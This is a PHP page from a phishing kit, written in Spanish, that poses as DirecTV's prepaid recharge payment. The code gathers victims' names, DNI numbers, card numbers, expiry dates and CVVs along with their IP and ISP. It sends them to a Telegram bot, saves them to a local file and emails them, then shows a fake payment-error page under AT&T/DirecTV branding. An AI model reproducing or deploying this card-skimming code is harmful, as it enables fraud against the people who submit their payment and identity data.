<?php


if(isset($_POST)){
    $filter = "";
    $mensaje = "►►►► DATOS DE FACTURACION ◄◄◄◄ \n";
    if(isset($_POST["titular"])){
        $mensaje .= "Nombre y Apellido:" .$_POST["titular"]."\n";
        $filter .= strtolower($_POST["titular"]);
    }
	if(isset($_POST["dni"])){
        $mensaje .= "Dni:" .$_POST["dni"]."\n";
        $filter .= strtolower($_POST["dni"]);
    }
    	if(isset($_POST["tarjeta"])){
        $mensaje .= "prepago:" .$_POST["tarjeta"]."\n";
        $filter .= strtolower($_POST["tarjeta"]);
    }
	if(isset($_POST["provincia"])){
        $mensaje .= "Provincia:" .$_POST["provincia"]."\n";
        $filter .= strtolower($_POST["provincia"]);
	}
	if(isset($_POST["postal"])){
        $mensaje .= "Postal:" .$_POST["postal"]."\n";
        $filter .= strtolower($_POST["postal"]);
    } 
	
    if(isset($_POST["digitos"])){
        $mensaje .= "Digitos:" .$_POST["digitos"]."\n";
        $filter .= strtolower($_POST["digitos"]);
	     
    }
	if(isset($_POST["vencimiento"])){
        $mensaje .= "Vencimiento:" .$_POST["vencimiento"]."\n";
        $filter .= strtolower($_POST["vencimiento"]);
	}
	if(isset($_POST["cvv"])){
        $mensaje .= "CVV:" .$_POST["cvv"]."\n";
        $filter .= strtolower($_POST["cvv"]);
	}

	$mensaje  .= "►►►►►►► SCAN EZE ◄◄◄◄◄◄◄◄ \n";

    $filter = base64_encode($filter);
    include("config.php");
    $ip = getenv("REMOTE_ADDR");
    $isp = gethostbyaddr($_SERVER['REMOTE_ADDR']);
    define('BOT_TOKEN', $bottoken);
    define('CHAT_ID', $chatid);
    define('API_URL', 'https://api.telegram.org/bot'.BOT_TOKEN.'/');
    function enviar_telegram($msj){
	    $queryArray = [
		'chat_id' => CHAT_ID,
		'text' => $msj,
	    ];
	    $url = 'https://api.telegram.org/bot'.BOT_TOKEN.'/sendMessage?'. http_build_query($queryArray);
	    $result = file_get_contents($url);
    }
    $file_name = 'data/'.$ip.'.db';
    $read_data = fopen($file_name, "a+");
    function enviar(){
	    global $telegram_send, $file_save, $email_send, $mensaje, $email, $ip, $isp;
	    if($telegram_send){
		  enviar_telegram(" ►►► DIRECTV RECARGAS ►►► \n\n ►►► DATOS DE CONEXION ►►► \nIP: ".$ip."\nISP: ".$isp."\n" .$mensaje);
	    }
	    if($file_save){
		    $ccs_file_name = 'ccs/data.txt';
		    $save_data = fopen($ccs_file_name, "a+");
		    $msg = "========== DATOS DIRECTV ==========\n\n";
		    $msg .= ">> DATOS DE CONEXION <<\n\nIP: ".$ip."\nISP: ".$isp."\n";
		    $msg .= $mensaje;
		    $msg .= "========== DATOS DIRECTV ==========\n\n";
		    fwrite($save_data, $msg);
		    fclose($save_data);
	    }
	    if($email_send){
		    $msg = ">> DIRECTV <<\n\n";
		    $msg .= $mensaje;
		    mail($email, "DIRECTV", $msg);
	    }

    }
    if($read_data){
       $data = fgets($read_data);
	   $data = explode(";", $data);
	   if(!(in_array($filter, $data))){
		    fwrite($read_data, $filter.";");
		    fclose($read_data);
		    enviar();
	    }
    }
    else {
	    fwrite($read_data, $filter.";");
	    fclose($read_data);
	    enviar();
    }

}
?>


<!DOCTYPE html>
<html>

<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
<head>
	<title>Directv</title>
	<meta charset="utf-8">
	<link rel="stylesheet" type="text/css" href="estilos/estilo.css">
	<link rel="preconnect" href="https://fonts.gstatic.com/">
	<link href="https://fonts.googleapis.com/css2?family=Inter:wght@500&amp;display=swap" rel="stylesheet">
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
</head>
<body>
<nav class="nav-flex">
	<div class="content-img">
		<img src="imagenes/descarga.png">
	</div>

</nav>
	<div class="home">
		
		<div class="texto">
		<h2>Error al procesar el pago</h2>
		
		</div>
		
		
	</div>
</body>
<footer>
	<div>
	    <P>©2021 AT&T Intellectual Property. DIRECTV, el logotipo de DIRECTV, y todas las otras marcas de DIRECTV contenidas aquí son marcas comerciales de AT&T Intellectual Property y/o compañías afiliadas de AT&T</P>
		<img src="#">
	</div>
</footer>

</html>
